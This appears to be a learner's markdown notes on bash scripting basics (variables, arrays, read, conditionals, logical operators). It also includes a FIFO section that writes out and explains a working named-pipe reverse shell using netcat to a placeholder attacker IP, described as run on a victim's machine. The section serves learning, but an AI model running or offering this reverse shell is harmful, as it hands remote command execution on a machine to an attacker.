*June09-2026*


## Good to read first
---
Recommended to review about [[Feynman-Technique#**Shell**|What is shell]]

## The Building blocks for basic scripting
---
*August 19, 2026*
These are what i considered the most minimal foundation.
- [[#Shebang]]
- [[#Variables]]
	- [[#How to use Positional Parameters]]
	- [[#Arrays]]
- [[#Reading Input]]
- [[#Conditional Expressions]]
	- [[#String Expressions]]
	- [[#File Expressions]]
	- [[#Arithmetic Expressions]]
	- [[#Exit Status Operators]]
- [[#Conditional Statements]]
- [[#Loops]]

```
Things to learn that is included in bandit level 23-24
- shopt -s nullglob
- || exit
```

A good reference: [bobbyiliev bash scripting](https://github.com/bobbyiliev/introduction-to-bash-scripting)

---
### Shebang 
---
```bash
========THE USUAL WAY==========
========ABSOLUTE PATH=========
#!/bin/bash  — for bash shell

#!/bin/sh    — for the default POSIX-compliant shell

#!/usr/bin/python3  — run the file as Python3 script.

======DYNAMIC ENVIRONMENT=====
====USES THE env COMMAND TO FIND THE PROGRAM IN THE CURRENT USERS $PATH
#!/usr/bin/env bash

#!/usr/bin/env python3 
```

>What is it?
- It is the first line of the script.
- It specifies the interpreter which programs to use to run the script file.

>How it works?
- Unlike windows, linux does not rely on extensions like `.py` or `.sh` to decide how to run a file.
- The linux kernel read the first two bytes of the file —— `#!`
- The kernel takes the path right next to it then passes the script to that specific program.

---

### Variables
---
A variable is used to store value and make it easy to use.
There are no data types like `string`, `bool` , etc. 

##### How to declare a variable
---
```
variable_name="Put Your value here"
```
**Note:** ==There should be no spaces before and after the `=` sign.==
**Note:** A variable declared in terminal is only available in current shell session. Its gone when you close the terminal

---

##### How to reference a variable
---
>You can access the variables using the `$` sign:
```
echo "$variable_name"
```
>**Note:**==Enclose the variable in quote.=== Read more here why: [Quoting Variables](https://github.com/bobbyiliev/introduction-to-bash-scripting/blob/main/ebook/en/content/004-bash-variables.md#quoting-variables)
 >Tldr:
```Qoute
"Without quotes, if a variable contains spaces, wildcards (`*`, `?`), or other special characters, Bash will interpret them rather than treating the value as a single string. This can cause scripts to break or behave unpredictably."
```

---

##### How to use the curly braces/variable boundary
---
- Used to explicitly states where the variable name ends
- This is required when the variable name is followed by a character/s (with no spaces) that could be interpreted as part of the variable name.
Example:
```
name="linux"

echo "$name_user"
>>>>  [it gonna be blank]

echo "${name}_user"
>>>>linux_user

echo "${#name}" #PreAppending a # to count the number of characters a string has. 
```
Without the curly braces, the interpreter treats the `name_user` as the variable name.
Explicitly enclosing it curly braces is good practice for beginner to avoid mistakes.

---

##### How to use Positional Parameters
---
A `Positional Parameters`— is a way to pass some "extra info" into the script file from a terminal

Example:
```
===========INSIDE YOU SCRIPT FILE========
#!/bin/bash

# ======in cp command the pattern is ====
#=======cp <chosen_file> <destination>===

cp "${1}" "${2}"


===========IN TERMINAL SESSION==========
./scriptfile.sh ./chosen_file  /destination/

```
**Note:** ==Enclose in qoute== if the parameter to be pass includes a spaces.
**Note:** A `"$0"` is used to reference the script file itself. It can be used to create self-destruct the file:
```
=========SELF DESTRUCT FILE USING THE "$0"============
======================================================

echo "This is file named ${0}"
rm -f "${0}"
```

>You can also use the `"@"` to indicate all arguments.

Example:
```
=================IN THE SCRIPT FILE==========

#!/bin/bash

cp "$@" /destination

============IN THE TERMINAL==================

./scriptfile.sh "my file.txt" "my-file2.txt" "my_file3.txt"
```

---
##### How to use command substitution
---
`Command Substitution` — a feature where you run a command and stores the output inside a variable
- It uses the syntax ==`variable_name=$(command)`==

Example:
```
current_dir=$(pwd) 
echo "${current_dir}"

today=$(date)
echo "${today}"
```

---

##### Arrays
---
Id like to define `Arrays`—  assigning multiple values in a single variable.
The pattern is: 
	==array_name=("value1" "value2" "value3" "value4")==

>**Accessing Elements**
```
array_name=("value1" "value2" "value3" "value4")

echo "${array_name[0]}"   #OUTPUTS THE FIRST ELEMENT

echo "${array_name[-1]}"  #OUTPUTS THE LAST ELEMENT

echo "${array_name[@]}"   #OUTPUTS ALL ELEMENTS

echo "${#array_name[@]}"   #PREPENDING WITH "#" TO COUNT THE NUMBER OF ELEMENTS IN THE ARRAY
```

>**Array Slicing**
```
echo "${array_name[@]:1:3}"  #OUTPUTS RANGE ELEMENT 1 TO 3

echo "${array_name[@]:2}"   #OUTPUTS ELEMENT 2 UP TO END: uses called PARAMETER EXPANSION
```

>**String Slicing**
>Pattern is:
>	==${string:start:length}==
>	- `Start` — the starting index (0-based)
>	- `Length` — the max num of characters to extract not the ending index.

```
text="This is a string"

echo "${text:3}"   #OUTPUTS from "s" to END

echo "${text:3:9}"  #OUTPUTS FROM INDEX 3 then count a total of 9.
```
---

##### How to use alias
---
`Alias` — a user-defined nickname or shortcut for longer commands
The pattern is: ==alias name="command"==
Example:
```
alias run_file="/home/user/lab/scripts/file.sh"

alias edit="nano /home/user/lab/scripts/file.sh"
```
Now, you can type `run_file` wherever directory you are

>**Reminder/Warning:** 

There is a thing called a `variable containing command text`:
```
run_file="/home/user/lab/scripts/file.sh"
$run_file
```
This will work but this is NOT A SHELL FEATURE. This one is NOT RECOMMENDED TO DO. 
 
---

### Reading Input
---
With use of `read`. It makes the scripts interactive by pausing execution.

Example:
```
#!/bin/bash

echo "Type your name:"
read name
echo "Your name is: ${name}"
```
Or you can make the code shorter by doing `read -p`
```
read -p "What is your name? " name
echo "Your name is: ${name}"
```
>Other options/flags combination to use are:
- `-s -p` — Silent mode: Hides characters (useful for password input)
- `-t 5 -p` — Enforce timeout in 5 seconds if no input is detected. (common examples are quizzes)
- `-n 1 -p` — Stops reading after  N character, even though not pressing an enter key.
	```
 		read -n 1 -p "Continue? [y/n] " answer
	```
- `-a` — split input into arrays 
	```
	read -p "Enter fruits seperated by spaces" -a fruits
	
	echo "${fruits[0]}"
	echo "${fruits[1]}"
	```

---

### Conditional Expressions
---
This is different to conditional statements.
This replace the long `if-else` block with single line of code
`Conditional Expressions` — used by `[[` compound command and the  `[` 

>Reminder: This topic is wide. You can read more here: [009-bash-conditional-expressions](https://github.com/bobbyiliev/introduction-to-bash-scripting/blob/main/ebook/en/content/009-bash-conditional-expressions.md)

For now this note will contain some but not all

##### String Expressions
---
>Basic Comparison
```
$name="Your Name"

[[ "${name}" = "Your Name" ]]   #Can be read as: "Test/Check if the value of $name is equal to "Your name"
[[ "${name}" != "Your Name"]]   #Can be read as: "Test/Check if the value of $name is NOT EQUAL to "Your name"

```

>Other common flags are:
```
[[ -z "${string}" ]] — #Test/Check if string length is zero

[[ -n "${string}" ]] — #Test/Check if the string length is NOT zero
```

##### Arithmetic Expressions
---
`Arithmethi Expressions` — Do math inside bash. useful once combining variables + conditions + loops

- Conditional Expressions uses `[[....]]` — for comparison
-  Arithmetic evaluation uses `((...))` — for actual arithmethic

Common examples are:
```
age=24
actual_age=18

[[ "${age}" -ge "${actual_age}" ]]   #Test/Check if $age is greate than or equal 

[[ "${age}" -eq "${actual_age}" ]]   #Test if EQUAL

[[ "${age}" -ne "${actual_age}" ]]    #Test if NOT equal

[[ "${age}" -lt "${actual_age}" ]]     #Test if LESS THAN

[[ "${age}" -le "${actual_age}" ]]     #Test if LESS or EQUAL

[[ "${age}" -gt "${actual_age}" ]]      #Test if GREATER THAN

[[ "${age}" -ge "${actual_age}" ]]      #Test if GREATER THAN OR EQUAL       

```
##### File Expressions
---
>Common Examples:
```
[[ -a "${file}" ]]   #Test/Check if a FILE EXIST    (legacy)
[[ -e "${file}" ]]   #Test/Check if a FILE EXISTS  (preferred to used)
[[ -f "${file}" ]]   #Test/Check if the file is a REGULAR file

[[ -d "${dir}" ]]    #Test/Check if the DIR EXIST

```

---

##### Exit Status Operators
---
`Exit Status` —  basically just a number that a command returns when it is done executing.

Common usage:
```
[[ $? -eq 0 ]]  returns true if the command was successful without any errors
[[ $? -gt 0 ]]  returns true if the command was not successful or had errors
```

==`$?`== — Is a special bash parameter that contains exit status of the most recent command 


---


---
## Logical Operator
---
Useful for control over the execution flow of commands.

**==OR / ||==**
Example:  
Pattern is:  ==*`command 1 || command 2`*==
```
cd /home/user/thisDir || exit    #Only run the exit command if the first command fails.
```

---

==**AND / &&**==
Example:
Pattern is: ==`command 1 && command 2`==
```
cp ~/this/file /to/destination && echo "success"

cd /thisDirectory && ls
```



## **FIFO** 
----
*June 28, 2026*
*First-In, First-Out* — method commonly knows as **named pipe**.
- An extension of the traditional pipe (`|`) 
- unlike a regular file, whatever you write into it comes out the other end **instantly in real time.**

#### **Example:** A Reverse Shell 
This is done in a victims compromised machine.
```bash
mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc [Attacker_IP] 4444 > /tmp/f
```

#### **Breakdown**

*Foundation: Standard Redirection with Netcat*
```
# Attacker
nc -lv 4444

# Victim
nc [attackerIP] 4444 > file
```
*Whatever the attacker types gets sent through the socket and written into `file` on the victim's machine. The file is a **dead end** — data goes in and sits there.*

In attacker's terminal, If type like
```
Hello, test, Hi
```
it doesnt display in victims terminal, but redirected in the `file`

**The Upgrade: Replacing the file with a FIFO**
```
# Attacker
nc -lv 4444

# Victim
nc [attackerIP] 4444 > /tmp/f
```

```d
cat /tmp/f          # reads from the FIFO (waiting for input)
| /bin/bash -i      # feeds that input into bash as commands
2>&1                # merges error messages into the output
| nc [attackerIP]   # sends bash output to attacker
> /tmp/f            # writes attacker's input BACK into the FIFO

```

**The Loop:**
```
Attacker types command
        ↓
nc receives it → writes to /tmp/f
        ↓
cat reads /tmp/f → feeds to bash
        ↓
bash executes → output goes to nc
        ↓
nc sends output back to attacker
        ↓
attacker sees result, types next command...
```

## **HOW TO**
---
*August 19,2026*

### Execute a file
---
*June09-2026*
By default a regular file doesnt have an execute permission. Read here [[User Management#^a2516e|the executre permission in files]]

But you can exectute a file by:

1. **`./filename`** — most common, works for binaries and scripts
	- The file must have execute permission `chmod +x filenmame`
	- The file  must have  a [[#Shebang]] at the first line
	
2. **`bash filename`** — only for shell scripts, not binaries
	- Explicitly states the shell to run the file using the shell `bash`
	- Doesnt need an execute permission
3. **`python3 filename` / `node filename`** — call the interpreter directly for other languages

> 💡 For **binaries** (like compiled C programs), only `./` works. `bash` will fail.